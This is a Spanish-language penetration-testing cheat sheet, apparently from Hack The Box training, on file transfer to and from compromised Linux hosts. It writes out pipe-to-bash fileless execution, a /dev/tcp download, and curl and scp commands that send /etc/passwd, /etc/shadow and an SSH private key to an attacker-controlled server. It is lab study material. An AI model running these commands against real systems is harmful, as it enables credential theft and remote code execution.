# Transferencia de archivos en Linux
Métodos para subir/descargar ficheros en sistemas Linux. La mayoría del malware usa **HTTP/HTTPS**, pero Linux también permite FTP, SMB, SSH, etc.

## Base64 (sin red)

Para ficheros pequeños, sin comunicación de red: codificas en origen, copias la cadena, decodificas en destino.

* Comprobar hash antes y después (para verificar la transferencia)

```bash
md5sum archivo
```

* Codificar a base64 (una sola línea con -w 0)

```bash
cat id_rsa | base64 -w 0; echo
```

* Decodificar en el destino

```bash
echo -n 'BASE64_STRING' | base64 -d > id_rsa
```

Funciona en ambos sentidos (subida y descarga).

## Descargas web (wget / curl)

* Con wget (nombre de salida con -O mayúscula)

```bash
wget https://url/LinEnum.sh -O /tmp/LinEnum.sh
```

* Con curl (nombre de salida con -o minúscula)

```bash
curl -o /tmp/LinEnum.sh https://url/LinEnum.sh
```

## Ataques fileless (sin escribir a disco)

Ejecutar directamente sin descargar, usando una tubería:

* Con curl

```bash
curl https://url/LinEnum.sh | bash
```

* Con wget (script Python)

```bash
wget -qO- https://url/helloworld.py | python3
```

## Descarga con Bash (/dev/tcp)

Cuando no hay wget ni curl (requiere Bash 2.04+ con net-redirections):

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

## SSH / SCP

SCP copia ficheros entre hosts de forma segura sobre SSH. Sintaxis parecida a `cp`, pero con usuario@IP.

* Habilitar e iniciar el servidor SSH en la Pwnbox

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

* Descargar (del remoto a local)

```bash
scp usuario@192.168.49.128:/root/myroot.txt .
```

* Subir (de local al remoto)

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

## Subida web

* Levantar un servidor que acepte subidas (uploadserver con HTTPS)

```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

* Subir ficheros desde la máquina comprometida (--insecure por el cert autofirmado)

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Servidor web rápido (para que el objetivo descargue)

```bash
python3 -m http.server              # Python 3 (puerto 8000)
python2.7 -m SimpleHTTPServer       # Python 2.7
php -S 0.0.0.0:8000                 # PHP
ruby -run -ehttpd . -p8000          # Ruby
```

Y desde el objetivo se descarga con:

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

Nota: al levantar un servidor, el tráfico entrante puede estar bloqueado por firewall. Descargar del objetivo a tu host funciona, pero subir hacia el objetivo puede fallar según las reglas.
